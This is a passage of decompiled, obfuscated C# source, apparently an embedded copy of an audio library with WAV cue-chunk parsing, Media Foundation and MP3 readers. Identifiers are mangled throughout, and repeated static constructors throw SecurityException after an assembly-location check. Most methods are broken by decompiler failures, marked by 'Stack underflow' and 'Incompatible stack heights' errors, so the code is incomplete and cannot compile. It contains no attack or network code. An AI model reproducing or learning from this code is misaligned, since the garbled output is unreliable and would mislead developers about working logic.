			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = global::_0008._007E_0001_0002;
			Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_0017: Stack underflow*/(stream);
		}

		public override int _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0082._007E_0006_0004;
			_ = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
			return /*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/, (byte[])/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, _0004);
		}

		public override long _0001(long _0002, SeekOrigin _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 2
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _000E_0003._007E_0089_0006;
			_ = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
			return /*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/, (long)/*Error near IL_0015: Stack underflow*/, (SeekOrigin)/*Error near IL_0015: Stack underflow*/);
		}

		public override void _0003(long _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 2
			_ = _007F_0002._007E_0084_0005;
			_ = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/, (long)/*Error near IL_001c: Stack underflow*/);
		}

		public override void _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0083._007E_0008_0004;
			_ = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_0016: Stack underflow*/((object)/*Error near IL_0016: Stack underflow*/, (byte[])/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, _0004);
		}

		protected override void _0001(bool _0002)
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = global::_0005._008A;
			if (0 == 0)
			{
				/*Error near IL_003b: Stack underflow*/((object)/*Error near IL_003b: Stack underflow*/, (byte)/*Error near IL_003b: Stack underflow*/ != 0);
			}
			if (this.m__0001 != null)
			{
				global::_0008._007E_0004_0002(this.m__0001);
				this.m__0001 = null;
			}
		}

		public override void _0003()
		{
			//IL_002c: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			_ = global::_0008._0099;
			/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/);
			if (((_0006)/*Error near IL_0010: Stack underflow*/).m__0001 != null)
			{
				global::_0008._007E_0099(this.m__0001);
				this.m__0001 = null;
			}
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0018
{
	internal sealed class _000F
	{
		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private string _0001;

		public int Position
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string Label
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000F)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000F)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _000F(int _0012_0090_0006, string _0013_0090_0006)
		{
			Position = _0012_0090_0006;
			if (_0013_0090_0006 == null)
			{
				_0013_0090_0006 = _0080._0014._0001(107396634);
			}
			Label = Regex.Replace(_0013_0090_0006, _0080._0014._0001(107386773), _0080._0014._0001(107396634));
		}
	}
}
namespace _0005
{
	internal sealed class _0007
	{
		internal readonly List<global::_0018._000F> _0001 = new List<global::_0018._000F>();

		public int[] CuePositions
		{
			get
			{
				//IL_003d: Incompatible stack heights: 0 vs 1
				//IL_0044: Incompatible stack heights: 0 vs 1
				_ = ((_0007)/*Error near IL_0007: Stack underflow*/)._0001.Count;
				int[] array = new int[/*Error near IL_000e: Stack underflow*/];
				for (int i = 0; i < this._0001.Count; i++)
				{
					array[i] = this._0001[i].Position;
				}
				return array;
			}
		}

		public string[] CueLabels
		{
			get
			{
				//IL_003d: Incompatible stack heights: 0 vs 1
				//IL_0044: Incompatible stack heights: 0 vs 1
				_ = ((_0007)/*Error near IL_0007: Stack underflow*/)._0001.Count;
				string[] array = new string[/*Error near IL_000e: Stack underflow*/];
				for (int i = 0; i < this._0001.Count; i++)
				{
					array[i] = this._0001[i].Label;
				}
				return array;
			}
		}

		public int Count
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0007)/*Error near IL_0007: Stack underflow*/)._0001.Count;
				return (int)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public global::_0018._000F this[int _0002]
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((List<global::_0018._000F>)/*Error near IL_0017: Stack underflow*/)[(int)/*Error near IL_0017: Stack underflow*/];
				return (global::_0018._000F)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public _0007()
		{
		}

		internal _0007(byte[] _0014_0090_0006, byte[] _0015_0090_0006)
		{
			int num = BitConverter.ToInt32(_0014_0090_0006, 0);
			Dictionary<int, int> dictionary = new Dictionary<int, int>();
			int[] array = new int[num];
			int num2 = 0;
			int num3 = 4;
			while (_0014_0090_0006.Length - num3 >= 24)
			{
				dictionary[BitConverter.ToInt32(_0014_0090_0006, num3)] = num2;
				array[num2] = BitConverter.ToInt32(_0014_0090_0006, num3 + 20);
				num3 += 24;
				num2++;
			}
			string[] array2 = new string[num];
			int num4 = 0;
			int num5 = 0;
			int num6 = global::_0011._0018._0001(_0080._0014._0001(107386748));
			for (int i = 4; _0015_0090_0006.Length - i >= 16; i += num4 + num4 % 2 + 12)
			{
				if (BitConverter.ToInt32(_0015_0090_0006, i) == num6)
				{
					num4 = BitConverter.ToInt32(_0015_0090_0006, i + 4) - 4;
					num5 = BitConverter.ToInt32(_0015_0090_0006, i + 8);
					num2 = dictionary[num5];
					array2[num2] = Encoding.Default.GetString(_0015_0090_0006, i + 12, num4 - 1);
				}
			}
			for (int j = 0; j < num; j++)
			{
				this._0001.Add(new global::_0018._000F(array[j], array2[j]));
			}
		}

		internal static _0007 _0001(_001C._0007 _0002)
		{
			_0007 result = null;
			byte[] array = null;
			byte[] array2;
			if (7u != 0)
			{
				array2 = null;
			}
			foreach (global::_0004._000E item in _0002.ExtraChunks)
			{
				if (_0010_0003._008B_0006(global::_0002._007E_0008(item.IdentifierAsString), _0080._0014._0001(107386739)))
				{
					array = global::_0011._0018._0001(_0002, item);
				}
				else if (_0010_0003._008B_0006(global::_0002._007E_0008(item.IdentifierAsString), _0080._0014._0001(107386698)))
				{
					array2 = global::_0011._0018._0001(_0002, item);
				}
			}
			if (array != null && array2 != null)
			{
				result = new _0007(array, array2);
			}
			return result;
		}

		static _0007()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0012
{
	internal sealed class _0004 : _001C._0007
	{
		private new global::_0005._0007 _0001;

		public global::_0005._0007 Cues
		{
			get
			{
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0025: Incompatible stack heights: 0 vs 1
				if (((_0004)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					global::_0005._0007 obj = global::_0005._0007._0001((_001C._0007)/*Error near IL_0012: Stack underflow*/);
					((_0004)/*Error near IL_0017: Stack underflow*/)._0001 = obj;
				}
				return _0001;
			}
		}

		public _0004(string _0089_0015)
			: base(_0089_0015)
		{
		}
	}
}
namespace _001C
{
	internal class _0007 : global::_0006._0006
	{
		internal new readonly global::_0005._0005 _0001;

		private new readonly bool m__0001;

		private new readonly long m__0001;

		private readonly long _0002;

		private new readonly object m__0001 = new object();

		internal new Stream _0001;

		[CompilerGenerated]
		private new readonly List<global::_0004._000E> m__0001;

		public List<global::_0004._000E> ExtraChunks
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
		}

		public override global::_0005._0005 WaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;

		public override long Length => ((_0007)/*Error near IL_0007: Stack underflow*/)._0002;

		public long SampleCount
		{
			get
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_0054: Incompatible stack heights: 0 vs 1
				//IL_0057: Incompatible stack heights: 0 vs 1
				if (((_0007)/*Error near IL_0007: Stack underflow*/)._0001._0001 == WaveFormatEncoding.Pcm || ((_0007)/*Error near IL_0016: Stack underflow*/)._0001._0001 == WaveFormatEncoding.Extensible || ((_0007)/*Error near IL_0029: Stack underflow*/)._0001._0001 == WaveFormatEncoding.IeeeFloat)
				{
					return _0002 / BlockAlign;
				}
				throw new InvalidOperationException(_0080._0014._0001(107386540));
			}
		}

		public override long Position
		{
			get
			{
				//IL_0015: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Expected I8, but got Unknown
				//IL_0018: Incompatible stack heights: 0 vs 2
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				Stream stream = ((_0007)/*Error near IL_000c: Stack underflow*/)._0001;
				/*Error near IL_001f: Stack underflow*/(stream);
				long num = ((_0007)/*Error near IL_0015: Stack underflow*/).m__0001;
				return /*Error near IL_0016: Stack underflow*/- num;
			}
			set
			{
				//IL_0067: Incompatible stack heights: 0 vs 1
				//IL_006d: Incompatible stack heights: 0 vs 2
				object obj = ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					value = _0008_0003._0087_0006(value, global::_0012._007E_0090_0002(this));
					value -= value % this._0001.BlockAlign;
					_007F_0002._007E_0083_0005(this._0001, value + this.m__0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public _0007(string _007F_0090_0006)
			: this(File.OpenRead(_007F_0090_0006), _0080_0090_0006: true)
		{
		}

		public _0007(Stream _000F_0090_0006)
			: this(_000F_0090_0006, _0080_0090_0006: false)
		{
		}

		private _0007(Stream _000F_0090_0006, bool _0080_0090_0006)
		{
			this._0001 = _000F_0090_0006;
			global::_0001._0015 obj = new global::_0001._0015();
			try
			{
				global::_0011._0018._0001(_000F_0090_0006, obj);
				this._0001 = obj._0001;
				this.m__0001 = obj._0001;
				_0002 = obj._0002;
				this.m__0001 = obj._0001;
			}
			catch
			{
				if (_0080_0090_0006)
				{
					_000F_0090_0006.Dispose();
				}
				throw;
			}
			Position = 0L;
			this.m__0001 = _0080_0090_0006;
		}

		protected override void Dispose(bool disposing)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0007)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				if (((_0007)/*Error near IL_0014: Stack underflow*/).m__0001)
				{
					global::_0008._007E_0099(this._0001);
				}
				this._0001 = null;
			}
			global::_0005._008A(this, disposing);
		}

		public override int Read(byte[] array, int offset, int count)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a9: Incompatible stack heights: 0 vs 1
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b9: Incompatible stack heights: 0 vs 1
			_ = ((_0007)/*Error near IL_000f: Stack underflow*/)._0001.BlockAlign;
			if (/*Error near IL_0015: Stack underflow*/ % /*Error near IL_0015: Stack underflow*/!= 0)
			{
				throw new ArgumentException(_009D._0093_0004(_0080._0014._0001(107386491), count, WaveFormat.BlockAlign));
			}
			object obj = this.m__0001;
			_0091_0002._009C_0005(obj);
			try
			{
				if (global::_0012._007E_0091_0002(this) + count > _0002)
				{
					count = (int)(_0002 - global::_0012._007E_0091_0002(this));
				}
				return _0082._007E_0006_0004(this._0001, array, offset, count);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		[Obsolete("Use ReadNextSampleFrame instead (this version does not support stereo properly)")]
		public bool _0001(out float _0002)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0007)/*Error near IL_0024: Stack underflow*/);
			float[] array = default(float[]);
			if (0 == 0)
			{
				array = (float[])/*Error near IL_0027: Stack underflow*/;
			}
			_0002 = ((array != null) ? array[0] : 0f);
			return array != null;
		}
	}
}
namespace _0001
{
	internal interface _0007
	{
		event EventHandler<global::_0016._0008> Sample;
	}
}
namespace _0016
{
	internal sealed class _0008 : EventArgs
	{
		[CompilerGenerated]
		private float _0001;

		[CompilerGenerated]
		private float _0002;

		public float Left
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float Right
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0008(float _001C_001D_0006, float _001D_001D_0006)
		{
			Left = _001C_001D_0006;
			Right = _001D_001D_0006;
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal class _0008 : global::_0006._0006
	{
		public new sealed class _0001
		{
			[CompilerGenerated]
			private bool m__0001;

			[CompilerGenerated]
			private bool _0002;

			[CompilerGenerated]
			private bool _0003;

			public bool RequestFloatOutput
			{
				[CompilerGenerated]
				get
				{
					//IL_0009: Incompatible stack heights: 0 vs 1
					return ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;
				}
				[CompilerGenerated]
				set
				{
					//IL_000b: Incompatible stack heights: 0 vs 1
					//IL_000e: Incompatible stack heights: 0 vs 1
					((_0001)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
				}
			}

			public bool SingleReaderObject
			{
				[CompilerGenerated]
				get
				{
					//IL_0009: Incompatible stack heights: 0 vs 1
					return ((_0001)/*Error near IL_0007: Stack underflow*/)._0002;
				}
				[CompilerGenerated]
				set
				{
					//IL_000b: Incompatible stack heights: 0 vs 1
					//IL_000e: Incompatible stack heights: 0 vs 1
					((_0001)/*Error near IL_0009: Stack underflow*/)._0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
				}
			}

			public bool RepositionInRead
			{
				[CompilerGenerated]
				get
				{
					//IL_0009: Incompatible stack heights: 0 vs 1
					return ((_0001)/*Error near IL_0007: Stack underflow*/)._0003;
				}
				[CompilerGenerated]
				set
				{
					//IL_000b: Incompatible stack heights: 0 vs 1
					//IL_000e: Incompatible stack heights: 0 vs 1
					((_0001)/*Error near IL_0009: Stack underflow*/)._0003 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
				}
			}

			public _0001()
			{
				RepositionInRead = true;
			}
		}

		internal new global::_0005._0005 _0001;

		private new long m__0001;

		private new _0001 m__0001;

		private new readonly string m__0001;

		internal new global::_0007._0013 _0001;

		internal long _0002;

		internal new byte[] _0001;

		internal new int _0001;

		internal int _0002;

		internal long _0003 = -1L;

		[CompilerGenerated]
		internal new EventHandler _0001;

		public override global::_0005._0005 WaveFormat => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public override long Length => ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_0004: Invalid comparison between Unknown and I8
				//IL_003f: Incompatible stack heights: 0 vs 1
				//IL_0046: Incompatible stack heights: 0 vs 1
				//IL_004d: Incompatible stack heights: 0 vs 1
				if ((long)/*Error near IL_0006: Stack underflow*/ < 0L)
				{
					_0080._0014._0001(107388827);
					_0080._0014._0001(107386680);
					throw new ArgumentOutOfRangeException((string?)/*Error near IL_0019: Stack underflow*/, (string?)/*Error near IL_0019: Stack underflow*/);
				}
				if (this.m__0001.RepositionInRead)
				{
					_0003 = value;
					this._0002 = value;
				}
				else
				{
					global::_0011._0018._0001(this, value);
				}
			}
		}

		public event EventHandler WaveFormatChanged
		{
			[CompilerGenerated]
			add
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._009F_0004(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._0001_0005(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		protected _0008()
		{
		}

		public _0008(string _0003_007F)
			: this(_0003_007F, null)
		{
		}

		public _0008(string _0003_007F, _0001 _0016_0090_0006)
		{
			this.m__0001 = _0003_007F;
			this._0001(_0016_0090_0006);
		}

		protected void _0001(_0001 _0002)
		{
			//IL_005e: Incompatible stack heights: 0 vs 1
			if (2u != 0)
			{
				global::_0011._0018._0001();
			}
			_0001 obj = _0002 ?? new _0001();
			((_0008)/*Error near IL_0011: Stack underflow*/).m__0001 = obj;
			global::_0007._0013 obj2 = this._0001(this.m__0001);
			this._0001 = global::_0011._0018._0001(obj2, this);
			obj2._0001(-3, _0003: true);
			this.m__0001 = global::_0011._0018._0001(obj2, this);
			if (this.m__0001.SingleReaderObject)
			{
				this._0001 = obj2;
			}
		}

		protected virtual global::_0007._0013 _0001(_0001 _0002)
		{
			//IL_0099: Incompatible stack heights: 0 vs 1
			//IL_00a9: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(((_0008)/*Error near IL_000a: Stack underflow*/).m__0001, (global::_0008._000E)null, out global::_0007._0013 obj);
			((global::_0007._0013)/*Error near IL_001f: Stack underflow*/)._0001(-2, _0003: false);
			obj._0001(-3, _0003: true);
			MediaType mediaType = new MediaType();
			mediaType.MajorType = _0080._0010._0002;
			mediaType.SubType = (_0002.RequestFloatOutput ? _001F._0011._0006 : _001F._0011._000F);
			MediaType mediaType2 = global::_0011._0018._0001(obj);
			mediaType.ChannelCount = mediaType2.ChannelCount;
			mediaType.SampleRate = mediaType2.SampleRate;
			obj._0001(-3, IntPtr.Zero, mediaType._0001);
			_0098._008A_0004(mediaType2._0001);
			return obj;
		}

		public override int Read(byte[] buffer, int offset, int count)
		{
			//IL_0148: Incompatible stack heights: 0 vs 1
			//IL_014e: Incompatible stack heights: 0 vs 1
			//IL_0154: Incompatible stack heights: 0 vs 1
			if (((_0008)/*Error near IL_000a: Stack underflow*/)._0001 == null)
			{
				_0001 obj = this.m__0001;
				global::_0007._0013 obj2 = ((_0008)/*Error near IL_0021: Stack underflow*/)._0001(obj);
				((_0008)/*Error near IL_0026: Stack underflow*/)._0001 = obj2;
			}
			if (_0003 != -1)
			{
				global::_0011._0018._0001(this, _0003);
			}
			int num = 0;
			if (_0002 > 0)
			{
				num += global::_0011._0018._0001(count - num, offset, this, buffer);
			}
			while (num < count)
			{
				this._0001._0001(-3, 0, out var _, out var mF_SOURCE_READER_FLAG, out var _, out var obj3);
				if ((mF_SOURCE_READER_FLAG & MF_SOURCE_READER_FLAG.MF_SOURCE_READERF_ENDOFSTREAM) != 0)
				{
					break;
				}
				if ((mF_SOURCE_READER_FLAG & MF_SOURCE_READER_FLAG.MF_SOURCE_READERF_CURRENTMEDIATYPECHANGED) != 0)
				{
					this._0001 = global::_0011._0018._0001(this._0001, this);
					global::_0011._0018._0001(this);
				}
				else if (mF_SOURCE_READER_FLAG != 0)
				{
					throw new InvalidOperationException(_0008_0002._0007_0005(_0080._0014._0001(107386689), mF_SOURCE_READER_FLAG));
				}
				obj3._0001(out global::_0018._0015 obj4);
				obj4._0001(out var intPtr, out var _, out var num5);
				global::_0011._0018._0001(num5, this);
				_0011_0003._008D_0006(intPtr, this._0001, 0, num5);
				this._0001 = 0;
				_0002 = num5;
				num += global::_0011._0018._0001(count - num, offset + num, this, buffer);
				obj4._0001();
				_0098._008A_0004(obj4);
				_0098._008A_0004(obj3);
			}
			this._0002 += num;
			return num;
		}

		protected override void Dispose(bool disposing)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			if (((_0008)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				global::_0007._0013 obj = ((_0008)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_0037: Stack underflow*/(obj);
				this._0001 = null;
			}
			global::_0005._008A(this, disposing);
		}
	}
}
namespace _001D
{
	internal sealed class _0008
	{
		[CompilerGenerated]
		private long _0001;

		[CompilerGenerated]
		private long _0002;

		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private int _0002;

		public long FilePosition
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public long SamplePosition
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0002 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int SampleCount
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int ByteCount
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0012
{
	internal sealed class _0005 : global::_0006._0006
	{
		public new delegate global::_0001._0004 _0001(global::_0005._0005 mp3Format);

		private new readonly global::_0005._0005 m__0001;

		internal new Stream _0001;

		internal new readonly long _0001;

		private readonly long _0002;

		[CompilerGenerated]
		private new _0016._0005 m__0001;

		private new readonly _0017._0007 m__0001;

		private new readonly bool m__0001;

		internal new List<_001D._0008> _0001;

		internal new int _0001;

		internal long _0003;

		private readonly int _0002;

		private readonly int _0003;

		private new global::_0001._0004 m__0001;

		private new readonly byte[] m__0001;

		private int _0004;

		private int m__0005;

		private bool _0002;

		private long _0004;

		private new readonly object m__0001 = new object();

		[CompilerGenerated]
		private new readonly global::_0014._0004 m__0001;

		[CompilerGenerated]
		private readonly byte[] _0002;

		public _0016._0005 Mp3WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0001 = (_0016._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0014._0004 Id3v2Tag
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
		}

		public byte[] Id3v1Tag
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0002;
			}
		}

		public override long Length
		{
			get
			{
				//IL_000f: Unknown result type (might be due to invalid IL or missing references)
				//IL_0011: Expected I8, but got Unknown
				//IL_0012: Incompatible stack heights: 0 vs 1
				//IL_0015: Incompatible stack heights: 0 vs 2
				_ = ((_0005)/*Error near IL_0007: Stack underflow*/)._0003;
				int num = ((_0005)/*Error near IL_000e: Stack underflow*/)._0002;
				return /*Error near IL_0010: Stack underflow*/* num;
			}
		}

